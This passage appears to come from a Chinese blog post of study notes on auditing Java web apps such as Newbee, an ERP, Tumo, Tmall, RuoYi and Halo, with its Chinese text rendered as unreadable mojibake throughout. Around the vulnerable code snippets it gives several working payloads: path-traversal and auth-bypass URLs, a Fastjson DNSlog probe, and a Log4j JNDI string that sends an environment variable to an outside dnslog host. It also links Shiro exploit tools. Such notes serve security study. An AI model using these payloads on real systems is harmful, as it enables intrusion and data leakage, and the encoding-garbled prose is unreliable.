class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(URLDecoder.decode(request.getRequestURI(), <span class="hljs-string">&quot;utf-8&quot;</span>));<br><br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> startpath.replace(<span class="hljs-string">&quot;/image&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(rootpath, path);<br><br><span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">sos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(f.getPath());<br><span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) f.length()];<br>IOUtils.readFully(input, data);<br><span class="hljs-comment">// å°†æ–‡ä»¶æµè¾“å‡ºåˆ°æµè§ˆå™¨</span><br>IOUtils.write(data, sos);<br>input.close();<br>sos.close();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯»æ‡‚ä¸€æ®µä»£ç ï¼šä»ä¸‹åˆ°ä¸Šè¿½è¸ªï¼Œæ‰¾åˆ°å˜é‡çš„ä¼ é€’ä¸å‡½æ•°ä¹‹é—´çš„å…³ç³»ï¼Œç†æ¸…ä»£ç å³å¯å¤§è‡´è¯»æ‡‚</p></li><li><p>æ‰“å°å‡ºæ¯ä¸ªè¿‡ç¨‹å‚æ•°çš„å€¼é€ä¸ªåˆ†æ</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A113.png"></p></li><li><p>å‘ç°ä¼ å…¥çš„å€¼æ˜¯rootpathä¸pathçš„å€¼çš„æ‹¼æ¥</p></li><li><p>æ„é€ payloadï¼š</p><ul><li><p>åŒæ ·æ˜¯ä½¿ç”¨..&#x2F;è·³åˆ°ä¸Šä¸€çº§çš„åŸç†</p></li><li><pre><code class="language-url">/image//image..//image..//image..//image..//image..//1.txt<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs processing"><br>  - æ ¹æ®æºä»£ç ï¼Œ/<span class="hljs-built_in">image</span>ä¼šè¢«æ›¿æ¢ä¸ºç©º<br><br>  - åªæœ‰urlä¸­åŠ ä¸Š/<span class="hljs-built_in">image</span>æ‰èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå…·ä½“åŸå› æœªçŸ¥<br><br>### é‰´æƒ æœªæˆæƒè®¿é—®<br><br>[Javaä»£ç å®¡è®¡&amp;é‰´æƒæ¼æ´&amp;Interceptor&amp;Filter&amp;Shiro&amp;JWT_javaé‰´æƒ-CSDNåšå®¢](https:<span class="hljs-comment">//blog.csdn.net/qq_46081990/article/details/135207986)</span><br><br><span class="hljs-number">1.</span> è¿‡æ»¤å™¨               -- é€»è¾‘å®‰å…¨é—®é¢˜<br><span class="hljs-number">2.</span> è‡ªå®šä¹‰ä»£ç        -- é€»è¾‘å®‰å…¨é—®é¢˜<br><span class="hljs-number">3.</span> shiroæ¡†æ¶éªŒè¯  -- æ‰¾shiroç‰ˆæœ¬æ¼æ´<br><br>- é‰´æƒä½¿ç”¨çš„æ¡†æ¶ï¼Œæ‹¦æˆªå™¨ï¼Œè¿‡æ»¤å™¨ç­‰<br><br>  ![](<span class="hljs-built_in">image</span>\javaå®¡è®¡<span class="hljs-number">14.</span>png)<br>  <br>  æ‹¦æˆªå™¨ä¸€èˆ¬æµç¨‹<br>  <br>  ![](<span class="hljs-built_in">image</span>\javaå®¡è®¡<span class="hljs-number">15.</span>png)<br><br>#### æŒ–æ˜ç‚¹<br><br><span class="hljs-number">1.</span> æ‹¦æˆªå™¨ä¸­æ˜¯å¦é‰´æƒ<br><span class="hljs-number">2.</span> è¿‡æ»¤å™¨ä¸­æ˜¯å¦é‰´æƒ<br><span class="hljs-number">3.</span> Shiroç‰ˆæœ¬åŠå…¶é€»è¾‘é…ç½®<br><span class="hljs-number">4.</span> æœ‰æ— JWT<br><span class="hljs-number">5.</span> ä»¥ä¸Šéƒ½æ²¡æœ‰ï¼ŒæŸ¥æ‰¾æ˜¯å¦æ˜¯è‡ªå†™ä»£ç é‰´æƒ<br><br>#### Newbeeæ¡ˆä¾‹(æ‹¦æˆªå™¨)<br><br>- ç¡®å®šé‰´æƒä½¿ç”¨çš„æ˜¯å“ªç§æ¨¡å¼<br>  - åœ¨pom.<span class="hljs-property">xml</span>æ–‡ä»¶ä¸­æœç´¢jwtå’Œshiroå…³é”®å­—ï¼Œå‘ç°å¹¶æ²¡æœ‰è¿™ä¸¤ç§ä¾èµ–çš„å¯¼å…¥<br>  - ç»§ç»­é€šè¿‡ç¿»çœ‹ç›®å½•ç¡®å®šæ˜¯è¿‡æ»¤å™¨è¿˜æ˜¯æ‹¦æˆªå™¨<br>  - ç¿»çœ‹è¿‡ç¨‹ä¸­å‘ç°æœ‰intercepetorç›®å½•<br>  <br>- ç¡®å®šä½¿ç”¨æ‹¦æˆªå™¨é‰´æƒ<br><br>- æ‹¦æˆªå™¨é‰´æƒä¸€èˆ¬å†™åœ¨preHandleæ–¹æ³•å†…<br><br>  ```java<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span>(HttpServletRequest request, HttpServletResponse response, <span class="hljs-built_in">Object</span> o) <span class="hljs-keyword">throws</span> Exception &#123;<br>      <span class="hljs-comment">// è·å–å½“å‰è¯·æ±‚çš„è·¯å¾„</span><br>      <span class="hljs-built_in">String</span> requestServletPath = request.<span class="hljs-property">getServletPath</span>();<br>      <br>      <span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚è·¯å¾„æ˜¯å¦ä»¥&quot;/admin&quot;å¼€å¤´ä¸”ä¼šè¯ä¸­æ²¡æœ‰&quot;loginUser&quot;å±æ€§ï¼ˆå³ç”¨æˆ·æœªç™»å½•ï¼‰</span><br>      <span class="hljs-keyword">if</span> (requestServletPath.<span class="hljs-property">startsWith</span>(<span class="hljs-string">&quot;/admin&quot;</span>) &amp;&amp; <span class="hljs-literal">null</span> == request.<span class="hljs-property">getSession</span>().<span class="hljs-property">getAttribute</span>(<span class="hljs-string">&quot;loginUser&quot;</span>)) &#123;<br>          <span class="hljs-comment">// è®¾ç½®é”™è¯¯æ¶ˆæ¯åˆ°ä¼šè¯ä¸­</span><br>          request.<span class="hljs-property">getSession</span>().<span class="hljs-property">setAttribute</span>(<span class="hljs-string">&quot;errorMsg&quot;</span>, <span class="hljs-string">&quot;è¯·ç™»é™†&quot;</span>);<br>          <span class="hljs-comment">// é‡å®šå‘åˆ°ç®¡ç†å‘˜ç™»å½•é¡µé¢</span><br>          response.<span class="hljs-property">sendRedirect</span>(request.<span class="hljs-property">getContextPath</span>() + <span class="hljs-string">&quot;/admin/login&quot;</span>);<br>          <span class="hljs-comment">// è¿”å›falseè¡¨ç¤ºä¸­æ–­è¯·æ±‚ç»§ç»­æ‰§è¡Œ</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// å¦‚æœå·²ç™»å½•æˆ–éadminè·¯å¾„è¯·æ±‚ï¼Œåˆ™æ¸…é™¤å¯èƒ½çš„é”™è¯¯æ¶ˆæ¯</span><br>          request.<span class="hljs-property">getSession</span>().<span class="hljs-property">removeAttribute</span>(<span class="hljs-string">&quot;errorMsg&quot;</span>);<br>          <span class="hljs-comment">// è¿”å›trueå…è®¸è¯·æ±‚ç»§ç»­æ‰§è¡Œ</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul><p>æ ¸å¿ƒåˆ¤æ–­è¯­å¥requestServletPath.startsWith(â€œ&#x2F;adminâ€) &amp;&amp; null </p><p>è·¯å¾„å¼€å¤´ä»¥adminå¼€å¤´ï¼Œå¹¶ä¸”sessionä¸­loginUserä¸ºnull</p></li><li><p>åˆ©ç”¨æ–¹å¼ï¼šæ„é€ è·¯å¾„ä¸º&#x2F;;&#x2F;adminæˆ–&#x2F;&#x2F;adminåè®¿é—®</p></li><li><p>å®æ“å‘ç°é¡µé¢æ˜¾ç¤º404ï¼ŒçŒœæµ‹æ˜¯ä¸æµè§ˆå™¨æœ‰å…³</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A116.png"></p></li></ul><h4 id="åå¤ERPæ¡ˆä¾‹-è¿‡æ»¤å™¨"><a href="#åå¤ERPæ¡ˆä¾‹-è¿‡æ»¤å™¨" class="headerlink" title="åå¤ERPæ¡ˆä¾‹(è¿‡æ»¤å™¨)"></a>åå¤ERPæ¡ˆä¾‹(è¿‡æ»¤å™¨)</h4><ul><li><p>åŒæ ·åœ¨ä¾èµ–ä¸­å…ˆæœç´¢jwtå’Œshiroå…³é”®å­—ï¼Œå‘ç°æ²¡æœ‰</p></li><li><p>ç¿»æ‰¾ç›®å½•çœ‹åˆ°filterç›®å½•ï¼Œå‘ç°æ˜¯è¿‡æ»¤å™¨è®¾ç½®</p></li><li><p>è¿‡æ»¤å™¨æ ¸å¿ƒä»£ç åœ¨doFilteræ–¹æ³•å†…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <br>    <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <br>    <span class="hljs-comment">// 1. å°† ServletRequest/ServletResponse è½¬æ¢ä¸º HttpServletRequest/HttpServletResponse</span><br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>    <br>    <span class="hljs-comment">// 2. è·å–å½“å‰è¯·æ±‚çš„ URL</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>    <br>    <span class="hljs-comment">// 3. æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼ˆsession ä¸­æ˜¯å¦æœ‰ &quot;user&quot; å±æ€§ï¼‰</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>    <br>    <span class="hljs-comment">// 4. å¦‚æœç”¨æˆ·å·²ç™»å½•ï¼Œç›´æ¥æ”¾è¡Œè¯·æ±‚</span><br>    <span class="hljs-keyword">if</span> (userInfo != <span class="hljs-literal">null</span>) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 5. å¦‚æœè¯·æ±‚çš„æ˜¯ç™»å½•é¡µï¼ˆ/login.htmlï¼‰æˆ–æ³¨å†Œé¡µï¼ˆ/register.htmlï¼‰ï¼Œç›´æ¥æ”¾è¡Œ</span><br>    <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>))) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 6. æ£€æŸ¥è¯·æ±‚æ˜¯å¦åœ¨å¿½ç•¥åˆ—è¡¨ï¼ˆignoredListï¼‰ä¸­ï¼Œå¦‚æœæ˜¯åˆ™æ”¾è¡Œ</span><br>    <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>        chain.doFilter(servletRequest, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 7. æ£€æŸ¥è¯·æ±‚æ˜¯å¦åœ¨ç™½åå•ï¼ˆallowUrlsï¼‰ä¸­ï¼Œå¦‚æœæ˜¯åˆ™æ”¾è¡Œ</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>            <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                chain.doFilter(request, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 8. å¦‚æœä»¥ä¸Šæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè¯´æ˜ç”¨æˆ·æœªç™»å½•ä¸”è®¿é—®çš„æ˜¯å—ä¿æŠ¤èµ„æºï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µ</span><br>    servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç™½åå•è¿‡æ»¤ç»•è¿‡é‰´æƒ</p></li><li><p>æŠ“åŒ…ï¼Œåœ¨æ•°æ®åŒ…urlå¤„æ›´æ”¹</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A117.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">/login.html/../account/getAccount     =  /account/getAccount <br>/register.html/../account/getAccount  =  /account/getAccount <br>/a.js/../account/getAccount           =  /account/getAccount  <br>/user/login/../../account/getAccount  =  /account/getAccount <br></code></pre></td></tr></table></figure></li></ul><h4 id="Tumoæ¡ˆä¾‹-Shiro"><a href="#Tumoæ¡ˆä¾‹-Shiro" class="headerlink" title="Tumoæ¡ˆä¾‹(Shiro)"></a>Tumoæ¡ˆä¾‹(Shiro)</h4><ul><li><p>åŒæ ·å…ˆåœ¨ä¾èµ–ä¸­æœç´¢å…³é”®å­—ï¼Œå‘ç°æ­¤æºä»£ç ä½¿ç”¨äº†shiroæ¡†æ¶</p></li><li><p>æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒæŸ¥æ‰¾èµ„æ–™åˆ¤æ–­æ˜¯å¦æœ‰æƒé™ç»•è¿‡æ¼æ´</p></li><li><p>æŸ¥çœ‹ç›®å½•æ‰¾åˆ°shiroé…ç½®æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">tumo.shiro.anon_url=\<br>  /login,/logout,/register,\<br>  /,/about,/p<span class="hljs-comment">/**,/links,/comment/**,/link/list,/article/list,\</span><br><span class="hljs-comment">  /css/**,/js/**,/img/**</span><br></code></pre></td></tr></table></figure><p>anonä»£è¡¨å¯ä»¥åŒ¿åè®¿é—®(æ— éœ€ç™»å½•)</p></li><li><p>å¯»æ‰¾urlåå¸¦æœ‰&#x2F;**çš„ï¼Œå¯ä»¥åˆ©ç”¨å®ƒè®¿é—®åˆ°å…¶ä»–åœ°å€</p></li></ul><h4 id="FastCMSæ¡ˆä¾‹-JWTé‰´æƒ"><a href="#FastCMSæ¡ˆä¾‹-JWTé‰´æƒ" class="headerlink" title="FastCMSæ¡ˆä¾‹(JWTé‰´æƒ)"></a>FastCMSæ¡ˆä¾‹(JWTé‰´æƒ)</h4><ul><li><p>JwtæŠ€æœ¯é‰´æƒ</p><ul><li>ç”Ÿæˆæ—¶ä½¿ç”¨ç©ºåŠ å¯†ï¼ˆé€»è¾‘ä»£ç é—®é¢˜ï¼‰</li><li>æœåŠ¡ç«¯æœªæ ¡éªŒç­¾åï¼ˆé€»è¾‘ä»£ç é—®é¢˜ï¼‰</li><li>å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹ï¼ˆæ­å»ºåæœªä¿®æ”¹ï¼‰</li><li>å¯†é’¥çˆ†ç ´å¯èƒ½æ€§å¤§ï¼ˆå¯†é’¥è¿‡äºç®€å•ï¼‰</li></ul></li><li><p>å¼€å§‹å®¡è®¡</p></li><li><p>æœç´¢å…³é”®å­—jwtå‘ç°æœ‰åŒ…å¼•ç”¨</p><p>æˆ–ï¼šæ•°æ®åŒ…ä¸­å­˜åœ¨jwtç‰¹å¾ï¼šä¸¤ä¸ªç‚¹å°†tokenåˆ†è§£ä¸ºä¸‰æ®µ</p></li><li><p>æ£€æŸ¥å¯†é’¥æ˜¯å¦ä¿®æ”¹</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A118.png"></p></li><li><p>è¶Šæƒå®ä¾‹ï¼š<a href="https://www.cnblogs.com/thebeastofwar/p/17920565.html">Nacosæ¼æ´å¤ç°æ€»ç»“ - BattleofZhongDinghe - åšå®¢å›­ (cnblogs.com)</a></p></li></ul><h3 id="ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´åˆ©ç”¨"><a href="#ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´åˆ©ç”¨" class="headerlink" title="ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´åˆ©ç”¨"></a>ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´åˆ©ç”¨</h3><ul><li>æ‰¾å­˜åœ¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶(Package Checkeræ’ä»¶)</li><li>æ‰¾ç»„ä»¶åˆ©ç”¨å…¥å£æ¡ä»¶(æ ¹æ®ç½‘ä¸Šå·²çŸ¥æ¼æ´å¤ç°æ¡ä»¶)</li><li>æ‰¾å¯æ§åœ°æ–¹æµ‹è¯•æ£€æµ‹(æ ¹æ®ç½‘ä¸Šå·²çŸ¥æ¼æ´åˆ©ç”¨æ¡ä»¶)</li></ul><h4 id="Tmallæ¡ˆä¾‹-Fastjson"><a href="#Tmallæ¡ˆä¾‹-Fastjson" class="headerlink" title="Tmallæ¡ˆä¾‹(Fastjson)"></a>Tmallæ¡ˆä¾‹(Fastjson)</h4><ul><li><p>åœ¨pom.xmlæ–‡ä»¶ä¸­æ‰¾åˆ°FastJsonçš„ä¾èµ–é¡¹ï¼Œå…¶ç‰ˆæœ¬ä¸º1.2.58</p></li><li><p>æ¼æ´è§¦å‘å‡½æ•°   JSON.parseObject()    JSON.parse()</p><ul><li><code>JSON.parseObject()</code> æ˜¯ FastJSON çš„æ ¸å¿ƒæ–¹æ³•ï¼Œç”¨äº JSON â†’ Java å¯¹è±¡çš„è½¬æ¢ã€‚</li><li>æ¯” <code>JSON.parse()</code>ï¼ˆè¿”å› <code>Object</code>ï¼‰æ›´å¸¸ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥ç›´æ¥æŒ‡å®šç›®æ ‡ç±»å‹ã€‚</li></ul></li><li><p>å…¨å±€æœç´¢å…³é”®å­—åï¼Œç»§ç»­å¯»æ‰¾æœ‰å¯æ§å˜é‡çš„åœ°æ–¹ï¼Œæ‰æœ‰åˆ©ç”¨ç‚¹</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A119.png"></p><p>æ‰¾åˆ°æ­¤ä»£ç å¹¶ä¸”å‘ç°æ­¤å˜é‡å¯æ§ï¼Œç¡®å®šæ­¤å¤„ä¸ºæ¼æ´è§¦å‘ç‚¹</p></li><li><p>æ­å»ºå¥½ç¯å¢ƒåé€šè¿‡ä»£ç å¯ä»¥åˆ¤æ–­æ¼æ´åˆ©ç”¨ç‚¹åœ¨æ·»åŠ å•†å“åŠŸèƒ½å¤„</p></li><li><p>æŠ“å–æ•°æ®åŒ…ï¼Œå°†propertyJsonå‚æ•°æ›´æ”¹ä¸ºpoc</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/liguangyao213/article/details/123929296">Fastjsonååºåˆ—åŒ–å®¡è®¡åŠéªŒè¯_fastjson 1.2.58æ¼æ´-CSDNåšå®¢</a></p><p>ä½¿ç”¨dnså¹³å°ï¼š{â€œ@typeâ€:â€java.net.Inet4Addressâ€,â€valâ€:â€3042zb.dnslog.cnâ€}</p><p>åœ¨å®æ“è¿‡ç¨‹ä¸­æœ‰500æŠ¥é”™</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A120.png"></p><p>åŸå› </p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A121.png"></p><p>è§†é¢‘æ¼”ç¤ºæ—¶å¯ä»¥æ”¶åˆ°è®¿é—®è¯·æ±‚</p><p>åç»­æŸ¥çœ‹æ—¶å‘ç°bpè‡ªå¸¦çš„æµ‹è¯•åœ°å€æ”¶åˆ°äº†è®¿é—®è¯·æ±‚</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A122.png"></p></li></ul><h4 id="Tmall-Log4j-2-10-0"><a href="#Tmall-Log4j-2-10-0" class="headerlink" title="Tmall-Log4j   2.10.0"></a>Tmall-Log4j   2.10.0</h4><ul><li><p>log4jæ¼æ´åŸç†</p><p><a href="https://www.freebuf.com/articles/web/364311.html">ä¸€æ–‡è¯»æ‡‚é¢è¯•å®˜éƒ½åœ¨é—®çš„Log4J2æ¼æ´ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895">log4jæ¼æ´æˆå› å’ŒåŸç†ï¼ˆJNDIå’ŒLDAPï¼‰_ï¼Œ8849ã€‚com-CSDNåšå®¢</a></p><p> Apache log4j2-RCE æ¼æ´æ˜¯ç”±äºLog4j2æä¾›çš„lookupåŠŸèƒ½ä¸‹çš„Jndi &#x3D;&#x3D;Lookup&#x3D;&#x3D;æ¨¡å—å‡ºç°é—®é¢˜æ‰€å¯¼è‡´çš„ï¼Œ&#x3D;&#x3D;è¯¥åŠŸèƒ½æ¨¡å—åœ¨è¾“å‡ºæ—¥å¿—ä¿¡æ¯æ—¶å…è®¸å¼€å‘äººå‘˜é€šè¿‡ç›¸åº”çš„åè®®å»è¯·æ±‚è¿œç¨‹ä¸»æœºä¸Šçš„èµ„æºã€‚è€Œå¼€å‘äººå‘˜åœ¨å¤„ç†æ•°æ®æ—¶ï¼Œå¹¶æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯è¿›è¡Œåˆ¤æ–­ï¼Œå¯¼è‡´Log4j2è¯·æ±‚è¿œç¨‹ä¸»æœºä¸Šçš„å«æœ‰æ¶æ„ä»£ç çš„èµ„æº å¹¶æ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œä»è€Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚&#x3D;&#x3D;</p></li><li><p>æœç´¢å…³é”®å­—(è§¦å‘ç‚¹) ï¼šlogger.error  logger.info</p></li><li><p>åœ¨è¯¸å¤šç»“æœä¸­å¯»æ‰¾å¸¦æœ‰å¯æ§å˜é‡çš„</p><p><img src="/image%5CJava%E5%AE%A1%E8%AE%A123.png"></p><p>å¯ä»¥é€šè¿‡æ›´æ”¹å›¾ç‰‡ä¸Šä¼ çš„æ–‡ä»¶åæ›´æ”¹å‚æ•°å€¼</p></li><li><p>åˆ©ç”¨jndiæ³¨å…¥</p><p><a href="https://xz.aliyun.com/news/11723">JNDIæ³¨å…¥åŸç†åŠåˆ©ç”¨è€ƒç©¶-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://blog.csdn.net/csd_ct/article/details/122916620">log4jæ¼æ´åˆ†æåŠæ€»ç»“_log4jæ¼æ´æ˜¯ä»€ä¹ˆ-CSDNåšå®¢</a></p></li><li><p>ä¸Šä¼ ç®¡ç†å‘˜å¤´åƒå›¾ç‰‡åæŠ“åŒ…ï¼Œæ›´æ”¹æ–‡ä»¶åä¸ºpoc</p><p>filename&#x3D;â€${jndi:ldap:&#x2F;&#x2F;${env:OS}.7ffb7b28.log.dnslog.sbs}â€</p></li><li><p>jndiæ³¨å…¥å·¥å…·ï¼šã€JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jarã€‘</p></li></ul><h4 id="RuoYi-v4-2-0-shiroæ¼æ´åˆ©ç”¨"><a href="#RuoYi-v4-2-0-shiroæ¼æ´åˆ©ç”¨" class="headerlink" title="RuoYi-v4.2.0(shiroæ¼æ´åˆ©ç”¨)"></a>RuoYi-v4.2.0(shiroæ¼æ´åˆ©ç”¨)</h4><h5 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h5><ul><li><p>æœç´¢å…³é”®å­—æŸ¥æ‰¾shiroä¾èµ–é¡¹ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬å· 1.4.2</p></li><li><p>æ‰¾åˆ°æ¼æ´åˆ©ç”¨æ–‡ç« </p></li><li><p>åœ¨æºä»£ç ä¸­ç›´æ¥æŸ¥æ‰¾key</p><ul><li><p>æœç´¢å…³é”®å­—setCipherKeyï¼Œæ‰¾åˆ°shiroå¯†é’¥</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A124.png"></p></li></ul></li><li><p>åœ¨å®æˆ˜ä¸­åˆ©ç”¨å·¥å…·çˆ†ç ´å¯†é’¥ï¼Œå­¦ä¹ ååºåˆ—åŒ–åé€‰æ‹©æŸæ¡æ”»å‡»é“¾ï¼Œå®ç°RCE</p></li><li><p>shiroååºåˆ—åŒ–å·¥å…·ï¼š<a href="https://github.com/Ares-X/shiro-exploit">GitHub - Ares-X&#x2F;shiro-exploit: Shiroååºåˆ—åŒ–åˆ©ç”¨å·¥å…·ï¼Œæ”¯æŒæ–°ç‰ˆæœ¬(AES-GCM)Shiroçš„keyçˆ†ç ´ï¼Œé…åˆysoserialï¼Œç”Ÿæˆå›æ˜¾Payload</a></p></li></ul><h5 id="æƒé™ç»•è¿‡"><a href="#æƒé™ç»•è¿‡" class="headerlink" title="æƒé™ç»•è¿‡"></a>æƒé™ç»•è¿‡</h5><p><a href="https://www.freebuf.com/vuls/231909.html">Shiroæƒé™ç»•è¿‡æ¼æ´åˆ†æï¼ˆCVE-2020-1957ï¼‰ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><ul><li><p>shiroçš„ä¸€èˆ¬è§„åˆ™</p><p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A125.png"></p></li><li><p>æ‰¾åˆ°ShiroConfig.javaæ–‡ä»¶æŸ¥çœ‹å…è®¸åŒ¿åè®¿é—®çš„ç›®å½•</p></li><li><p>æ ¹æ®æ–‡ç« æ„é€ pocæµ‹è¯•</p></li></ul><h4 id="Halo-H2Database"><a href="#Halo-H2Database" class="headerlink" title="Halo(H2Database)"></a>Halo(H2Database)</h4><p><a href="https://www.cnblogs.com/ArcherCY/p/17699288.html">H2 databaseæ¼æ´å¤ç° - Running_J - åšå®¢å›­ 